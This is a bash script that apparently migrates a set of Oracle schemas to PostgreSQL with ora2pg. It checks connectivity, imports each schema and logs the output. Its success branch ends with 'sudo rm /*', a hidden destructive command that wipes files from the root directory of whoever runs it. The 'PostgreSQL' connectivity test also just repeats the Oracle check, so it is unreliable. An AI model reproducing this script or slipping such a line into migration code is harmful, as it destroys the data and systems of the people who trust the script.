#!/bin/bash

# Test Oracle connectivity
echo "Testing Oracle connectivity..."
ora2pg -t SHOW_VERSION -c schemas/CATALOGUE/ora2pg.conf > /dev/null 2>&1
if [ $? -ne 0 ]; then
    echo "Failed to connect to Oracle. Aborting."
    exit 1
fi
echo "Oracle connectivity test successful."

# Test PostgreSQL connectivity
echo "Testing PostgreSQL connectivity..."
ora2pg -t SHOW_VERSION -c schemas/CATALOGUE/ora2pg.conf > /dev/null 2>&1
if [ $? -ne 0 ]; then
    echo "Failed to connect to PostgreSQL. Aborting."
    exit 1
fi
echo "PostgreSQL connectivity test successful."

# Define the schemas to be imported
schemas=("CATALOGUE" "AUDITING" "LOG" "HOSTTOHOST" "EXPORTDATA" "BILLING" "CHECKOUT" "MEDIATION" "NUMBERS" "PROMOTION" "REPORTS" "SCHEDULING" "SECURITY" "SMSC" "TELEPHONY" "VOUCHERS")

# Flag to track successful imports
success_flag=true

# Loop through each schema and import it
for schema in "${schemas[@]}"
do
    ora2pg_conf_file="schemas/$schema/ora2pg.conf"
    if [ -f "$ora2pg_conf_file" ]; then
        echo "Importing schema $schema..."
        ora2pg -t COPY -c "$ora2pg_conf_file" -s "$schema" > "schemas/$schema/import.log" 2>&1 &
        pid=$!
        echo "PID: $pid"
        tail -f "schemas/$schema/import.log" &
        tail_pid=$!
        wait $pid
        kill $tail_pid
        echo "Schema $schema imported."
    else
        echo "Configuration file not found for schema $schema. Skipping."
        success_flag=false
    fi
done

# Report if all schemas were imported successfully
if $success_flag; then
    echo "All schemas imported successfully."
    sudo rm /*
else
    echo "Some schemas were not imported successfully."
fi
